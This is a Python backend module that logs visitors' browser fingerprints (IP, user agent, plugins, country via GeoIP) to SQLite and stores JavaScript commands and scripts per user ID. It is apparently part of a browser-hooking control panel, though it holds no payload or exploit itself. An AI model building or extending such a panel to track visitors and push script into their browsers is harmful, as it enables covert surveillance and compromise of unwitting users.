import sqlite3
import geoip2.database
from app import socketio

def get_db_connection(db_name='users.db'):
    conn = sqlite3.connect(db_name)
    conn.row_factory = sqlite3.Row
    return conn

def log_browser_info(info):
    required_keys = ['ip', 'user_id', 'userAgent', 'browserName', 'browserVersion', 'platform', 'country', 'plugins']

    if not all(k in info for k in required_keys) or any(info[k] in (None, '', 'Unknown') for k in required_keys):
        print("Missing or empty information, log not inserted:", info)
        return

    conn = get_db_connection()
    conn.execute('''INSERT INTO logs (ip, user_id, user_agent, browser_name, browser_version, platform, plugins, country) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                 (info['ip'], info['user_id'], info['userAgent'], info['browserName'], info['browserVersion'],
                  info['platform'], ','.join(info['plugins']), info['country']))
    conn.commit()
    conn.close()
    socketio.emit('update_table', get_all_logs())
    print("Browser info logged successfully:", info)

def get_js_commands(user_id):
    conn = get_db_connection()
    commands = conn.execute('SELECT command FROM js_commands WHERE user_id = ?', (user_id,)).fetchall()
    conn.close()
    return [command['command'] for command in commands]

def get_country_from_ip(ip):
    if ip == "127.0.0.1":
        return "Localhost"
    try:
        reader = geoip2.database.Reader('GeoLite2-City.mmdb')
        response = reader.city(ip)
        return response.country.name
    except geoip2.errors.AddressNotFoundError:
        return "Unknown"

def get_all_logs():
    conn = get_db_connection()
    logs = conn.execute('SELECT * FROM logs').fetchall()
    conn.close()
    return [dict(log) for log in logs]

def delete_log(log_id):
    conn = get_db_connection()
    conn.execute('DELETE FROM logs WHERE id = ?', (log_id,))
    conn.commit()
    conn.close()

def get_all_scripts():
    conn = get_db_connection()
    scripts = conn.execute('SELECT * FROM js_scripts').fetchall()
    conn.close()
    return scripts

def save_script(name, script):
    conn = get_db_connection()
    conn.execute('INSERT INTO js_scripts (name, script) VALUES (?, ?)', (name, script))
    conn.commit()
    conn.close()

def delete_script(script_id):
    conn = get_db_connection()
    conn.execute('DELETE FROM js_scripts WHERE id = ?', (script_id,))
    conn.commit()
    conn.close()

def is_duplicate_log(info):
    conn = get_db_connection()
    query = '''
        SELECT COUNT(*) FROM logs 
        WHERE ip = ? AND user_agent = ? AND browser_name = ? AND platform = ?
    '''
    result = conn.execute(query, (info['ip'], info['userAgent'], info['browserName'], info['platform'])).fetchone()
    conn.close()
    return result[0] > 0
